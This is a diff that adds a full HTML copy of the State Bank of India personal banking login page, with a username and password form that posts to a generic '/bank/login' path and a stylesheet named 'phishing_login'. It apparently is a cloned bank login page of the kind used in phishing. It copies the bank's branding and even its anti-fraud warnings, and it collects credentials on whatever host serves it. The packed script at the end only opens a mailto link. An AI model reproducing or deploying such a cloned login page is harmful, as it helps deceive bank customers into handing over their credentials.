@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="en"><head>
+<title> State Bank of India - Personal Banking</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+<meta http-equiv="PRAGMA" content="NO-CACHE">
+<meta http-equiv="EXPIRES" content="0">
+
+<meta name="format-detection" content="telephone=yes">
+<meta http-equiv="Content-Type" content="text/xhtml; charset=UTF-8">
+<meta name="viewport" id="viewport" content="width=device-width,minimum-scale=1.0">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="MobileOptimized" content="320">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+
+<link rel="stylesheet" href="css/bootstrap-5.3.3.min.css" type="text/css">
+<link rel="stylesheet" href="css/phishing_login_lang_revamp.css" type="text/css">
+
+<script type="text/javascript" src="js/jquery-3.7.1.min.js"></script>
+<script type="text/javascript" src="js/bootstrap.bundle-5.3.3.min.js"></script>
+<script type="text/javascript" src="js/common_virtual.js"></script>
+<script type="text/javascript" src="js/virtualkb_login_revamp.js"></script>
+<script type="text/javascript" src="js/jquery.vticker.min.js"></script>
+
+<script language="JavaScript">
+window.history.forward(0);
+</script>
+<script>
+$(document).ready(function() {
+
+	$("div").delegate(".arrow", "click", function(e){
+		e.stopPropagation();
+		$("#header_navigation").slideToggle("swing");
+		if($(this).hasClass('arrow_up') ) {
+			$(this).removeClass('arrow_up').addClass('arrow_down');
+		} else {
+			$(this).removeClass('arrow_down').addClass('arrow_up');
+		}
+    });
+
+	$('#reset_btn').click(function(){
+		document.getElementById("chkbox").checked = false;
+	});
+
+	$(function () {
+		$(window).scroll(function () {
+			if ($(this).scrollTop() > 100) {
+				$("#scrollup").fadeIn()
+			} else {
+				$("#scrollup").fadeOut()
+			}
+		});
+		$("#scrollup").click(function () {
+			$("body,html").animate({
+				scrollTop: 0
+			}, 800);
+			return false
+		});
+	});
+
+	$('#netbanking_branches a').click(function(){
+		if($('#netbanking_popup').is(':hidden')) {
+			$('#netbanking_popup').slideDown(400);
+			$('#header').animate({'marginTop':'138px'});
+			$(this).addClass('netbanking_button_up');
+		}else{
+			$('#netbanking_popup').slideUp(400);
+			$('#header').animate({'marginTop':'0px'});
+			$(this).removeClass('netbanking_button_up');
+		}
+	});
+
+});
+</script>
+
+<style>
+#forms li a{
+	display:block;
+	color:#575757;
+	margin:0 10px 0 0;
+}
+
+.user_details span {
+    color:#AD0000;
+    font-weight:bold;
+}
+
+.user_details .btn-default {
+    background:#3C5A77;
+    border:0 none;
+	border-radius:0;
+}
+
+.virtual_link a{
+	color:#24557F;
+}
+
+.login_box_links li a{
+	display:block;
+    padding:0 0 5px;
+	color:#255783;
+}
+
+.login_box .glyphicon{
+	font-size:32px;
+	color:#145A8F;
+	display:block;
+}
+
+#wpanel_vticker ul li{
+	box-sizing: border-box;
+    color: #9B1F1C;
+    font-weight: bold;
+    overflow: hidden;
+    white-space: nowrap;
+	font-size: 13px;
+	line-height: 31px;
+	height:31px;
+}
+
+.language_selection_btn button {  border:0; border-radius:0; background-color:#0f6b5a !important; color: #fff45c !important; font-size: 12px !important; padding: 6px 12px; }
+
+#wrapper {
+    max-width: 1900px;
+    padding: 0px;
+}
+
+@media (min-width: 768px) and (max-width: 991px){
+.continue_btn a{
+margin-bottom:0px;
+}
+}
+</style>
+
+</head>
+
+<body>
+ <div id="shadow">
+ <div id="wrapper" class="container-fluid">
+
+<title>State Bank of India</title>
+
+	<header id="headerContent">
+	<div class="row m-0" id="header">
+		<div class="col-lg-3 col-md-2 col-sm-2 xs-padding">
+			<a href="https://sbi.bank.in/" target="_blank;" rel="noopener noreferrer" id="logo" aria-label="SBI Logo"></a>
+		</div>
+		<div class="col-lg-9 col-md-10 col-sm-10">
+		<div id="header_core_info">
+				<div class="pull-right">
+					<div id="header_navigation">
+						<ul id="forms" class="pull-right">
+							<li id="homeLoanButton"> <a href="https://homeloans.sbi/" target="_blank" rel="noopener noreferrer" accesskey="3" title="SBI Home Loan" aria-label="SBI Home Loan">
+								<img src="images/HomeLoanButton.png" alt="SBI Home Loan" title="SBI Home Loan"></a></li>
+							<li class="about">
+								<a href="/sbijava/retail/html/aboutus.html" target="_blank" rel="noopener noreferrer" accesskey="3" title="About OnlineSBI" aria-label="About OnlineSBI">
+									About OnlineSBI </a>
+							 </li>
+							<li>
+								<a href="/npersonal/reg_forms.html" target="_blank" rel="noopener noreferrer" title="Forms" aria-label="Forms">
+									Forms</a>
+							</li>
+							<li>
+								<a href="javascript:void(0);" class="last" onclick="openpopup();" aria-label="Net Banking Branches">Net Banking Branches</a>
+							</li>
+							<li>
+								<div class="dropdown language_selection_btn">
+								  <button id="dLabel" class="dropdown-toggle" type="button" data-bs-toggle="dropdown">
+									Language <span class="caret"></span>
+								  </button>
+								  <ul class="dropdown-menu language_selection" aria-labelledby="dLabel">
+									  <li href="#" class="dropdown-item"><a href="login.htm?languagecode=en" aria-label="English Language"> <span>English</span> </a> </li>
+									<li href="#" class="dropdown-item"><a href="login.htm?languagecode=hi_IN" aria-label="Hindi Language"> <span>Hindi</span></a> </li>
+								  </ul>
+								</div>
+							</li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	</header>
+
+<div class="row m-0" id="primary_navigation">
+	<nav role="navigation" class="navbar navbar-expand-md navbar-default p-0 navbar-dark" id="navContent">
+		<button id="ChangeToggle" type="button" data-bs-target="#navbarCollapse" data-bs-toggle="collapse" class="navbar-toggler navbar-btn" aria-label="Main navigation">
+			<span class="navbar-toggler-icon text-white"></span>
+			<i class="fa fa-bars" style="color:#fff; font-size:28px;"></i>
+		</button>
+		<div class="arrow_icon pull-right d-md-none">
+			<a href="javascript:void(0);" class="arrow arrow_up" aria-label="arrow"> </a>
+		</div>
+
+		<div id="navbarCollapse" class="collapse navbar-collapse nav-comn">
+			<ul class="nav navbar-nav" id="navigation">
+				<li class="active_menu"><a href="/" aria-label="Home">Home</a></li>
+				<li><a href="#" onclick="window.open('/npersonal/productandservices.html','productservice','width=780, height=500, status=1, scrollbars=1, location=0')" aria-label="Products & Services">Products & Services</a></li>
+				<li><a href="/npersonal/rinb_videos.html" target="_blank" rel="noopener noreferrer" aria-label="How Do I (Help)">How Do I (Help)</a></li>
+				<li><a href="https://www.sihub.in/managesi/sbi" target="_blank" aria-label="Manage Debit Card E-Mandate">Manage Debit Card E-Mandate</a></li>
+				<li><a href="https://retail.sbi.bank.in/npersonal/contact_us.html" target="_blank" aria-label="Contact Us">Contact Us</a></li>
+			</ul>
+		</div>
+	</nav>
+</div>
+
+<form name="quickLookForm" method="post" action="/bank/login" autocomplete="off">
+	<div id="login_block" style="display: block;">
+		<div class="row m-0">
+			<div class="login_heading login_tickermsg">
+				<div class="d-md-flex">
+					<div class="col-lg-2 col-md-2 col-sm-3 col-xs-12">
+						<h3>Login to OnlineSBI</h3>
+					</div>
+					<div class="col-lg-7 col-md-6 col-sm-5 col-xs-12">
+						<div id="wpanel_vticker">
+							<ul style="position: absolute; margin: 0px; padding: 0px; top: 0px;">
+								<li style="margin: 0px; padding: 0px;">
+									Dear Customer, Mandatory login and profile password change introduced for added security.
+								</li>
+							</ul>
+						</div>
+					</div>
+					<div class="col-lg-3 col-md-4 col-sm-4 hidden-xs">
+						<span class="welcome_text">Welcome to Personal Internet Banking</span>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="err_mssg_fe"></div>
+
+		<div id="login_fields">
+			<div class="row m-0 d-sm-flex">
+				<div class="col-lg-6 col-md-6 col-sm-12 user_details">
+					<p>
+						(<span>CARE:  </span>Username and password are case sensitive.)
+					</p>
+
+					<div class="row m-0">
+						<div class="col-lg-6 col-md-6 col-sm-6">
+							<div class="form-group">
+								<label for="username">Username* </label>
+								<input name="userName" type="text" class="form-control" id="username" size="30" maxlength="30" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);" aria-label="userName">
+							</div>
+							<div class="form-group">
+								<label for="label2">Password* </label>
+								<input name="password" type="password" autocomplete="off" class="form-control" id="label2" title="password" size="30" onfocus="disableautocompletion(this.id);getFocus(this.id);" onblur="disableautocompletion(this.id);" oncopy="return false" onpaste="return false" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);" aria-label="confirm password">
+							</div>
+
+							<div class="form-group">
+								<input style="width:65px;" class="btn btn-default" type="submit" title="Login" value="Login" id="Button2">
+								<input style="width:65px;" class="btn btn-default" type="reset" title="Reset" id="reset_btn" value="Reset" onclick="constructKeyboard(false)">
+							</div>
+						</div>
+
+						<div class="col-lg-6 col-md-6 col-sm-6 forgot_details">
+							<ul class="user_links">
+								<li><a onclick="fnNewUserClick();" href="#" aria-label="New User? Register here/Activate">New User ? Register here/Activate </a></li>
+								<li><a onclick="window.open('troubleloginhome.htm?bankCode=0','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes')" href="#" aria-label="Forgot Username/Login Password">Forgot Username / Login Password </a></li>
+							</ul>
+
+							<div class="virtual">
+								<p class="m-0">
+									<input aria-label="Enable Virtual Keyboard" type="checkbox" id="chkbox" class="chek_box" onclick="constructKeyboard();">
+									Enable Virtual Keyboard
+								</p>
+							</div>
+
+							<div class="col-sm-12 care_msg">
+
+							</div>
+						</div>
+					</div>
+					<div class="virtual_link">
+						For better security use the Online Virtual Keyboard to login.
+						<a href="/npersonal/virtualkeyboard.html" aria-label="More"><strong>More</strong>...</a>
+					</div>
+				</div>
+
+				<div class="col-lg-6 col-md-6 col-sm-12 col-comn vk_bgmain vigilant_bgcolor">
+					<div id="login_banner">
+						<div id="vkb_content" class="virtual_key ">
+							<div id="vkb_content" class="virtual_key ">
+								<span id="kbplaceholder"> </span>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="row m-0" id="login_area">
+			<div class="col-lg-4 col-md-4 col-sm-12">
+				<div class="login_box">
+					<span class="infoIcon"></span>
+					<p>NEVER respond to any popup,email, SMS or phone call, no matter how appealing or official looking, seeking your personal information such as username, password(s), mobile number, ATM Card details, etc. Such communications are sent or created by fraudsters to trick you into parting with your credentials.</p>
+				</div>
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-12">
+				<div class="login_box">
+					<span class="linkIcon"></span>
+					<div class="login_xs w-100">
+						<div class="row m-0">
+							<div class="col-md-6 col-sm-6 col-xs-12">
+								<ul class="login_box_links">
+									<li><a href="https://crcf.bank.sbi" aria-label="Complaints">Complaints</a></li>
+									<li><a onclick="window.open('troubleloginhome.htm?bankCode=0','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0, resizable=yes')" href="#" aria-label="Trouble logging in">Trouble logging in</a></li>
+									<li><a href="/npersonal/passwordmanagement.html" target="_blank" rel="noopener noreferrer" aria-label="Password Management">Password Management</a></li>
+									<li><a href="/npersonal/securitytips.html" target="_blank" rel="noopener noreferrer" aria-label="Security Tips">Security Tips</a></li>
+									<li><a href="/npersonal/faq.html" target="_blank" rel="noopener noreferrer" aria-label="FAQ">FAQ</a></li>
+								</ul>
+							</div>
+							<div class="col-md-6 col-sm-6 col-xs-12">
+								<ul class="login_box_links me-0">
+									<li><a href="/npersonal/aboutphishing.html" target="_blank" rel="noopener noreferrer" aria-label="About Phishing">About Phishing</a></li>
+									<li><a href="javascript:openemail()" aria-label="Report Phishing">Report Phishing</a></li>
+									<li><a onclick="window.open('/preretail/lockunlockuseraccess.htm','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes')" href="#" style="color: #AD0000 !important" aria-label="Lock & Unlock User"><span></span>Lock & Unlock User</a></li>
+									<li><a onclick="window.open('blockatmcardintermediate.htm','hotlistatmcard','width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes');return true;" href="#" aria-label="Block ATM Card">Block ATM Card</a></li>
+								</ul>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-12">
+				<div class="login_box">
+					<span class="tickIcon" style="MARGIN-BOTTOM: 10PX;"></span>
+					<p>This site is certified by Verisign as a secure and trusted site. All information sent or received in this site is encrypted using 256-bit encryption</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="row m-0" id="provide_list">
+			<div class="col-lg-12 col-md-12 col-sm-12">
+				<ul class="provide">
+					<li>Mandatory fields are marked with an asterisk (*)</li>
+					<li>Do not provide your username and password anywhere other than in this page</li>
+					<li>Your username and password are highly confidential. Never part with them.<strong>SBI </strong>will never ask for this information.</li>
+				</ul>
+			</div>
+		</div>
+	</div>
+</form>
+
+<div class="row m-0" id="footer">
+	<div id="footer_area">
+		<div class="col-lg-4 col-md-4 col-sm-4 ps-3">
+		</div>
+	</div>
+
+	<div class="col-sm-12 col-xs-12" id="best_view">
+		<div class="float-start">
+			<p>© State Bank of India (APM Id: Serv_Tran_552)</p>
+		</div>
+		<div class="float-end hidden-xs">
+			<p>Site best viewed at 1024 x 768 resolution in Microsoft Edge 79 +, Mozilla 96 +, Google Chrome 97 +</p>
+		</div>
+	</div>
+	<div title="Move To Top" id="scrollup" style="display: block;"></div>
+</div>
+
+<div id="myModal" class="modal fade net_branch" role="dialog">
+	<div class="modal-dialog modal-xl">
+		<div class="modal-content">
+			<div class="row">
+				<div class="col-md-3 d-none d-md-block">
+				</div>
+				<div class="col-md-9" style="padding-left:45px;">
+					<div class="modal-header">
+						<h4 class="pull-left">Netbanking Branches</h4>
+						<button aria-label="Close" type="button" class="btn-close" data-bs-dismiss="modal"></button>
+					</div>
+					<div class="modal-body">
+						<p style="margin:0px;">All branches of State Bank of India are Internet Banking enabled. If you already have an account with us, ask your branch to give you Internet Banking. If you don't have an account, just step into any of our branches and open an account with Internet Banking facility. Internet Banking facility is available free of cost. Location of our branches can be known by visiting <a href="https://sbi.bank.in/" aria-label="Link">https://sbi.bank.in/</a>.</p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+</div>
+</div>
+
+<script type="text/javascript">
+	constructKeyboard();
+</script>
+
+<script type="text/javascript">
+function fnNewUserClick(){
+	window.open('newuserreg.htm','aboutus','width=920, height=500 ,status=1, scrollbars=1, location=0,resizable=yes');
+}
+
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 2(){1.0="4:5.8@7.6.9"}',10,10,'location|document|openemail|function|mailto|report|co|sbi|phishing|in'.split('|'),0,{}))
+
+</script>
+
+</body></html>
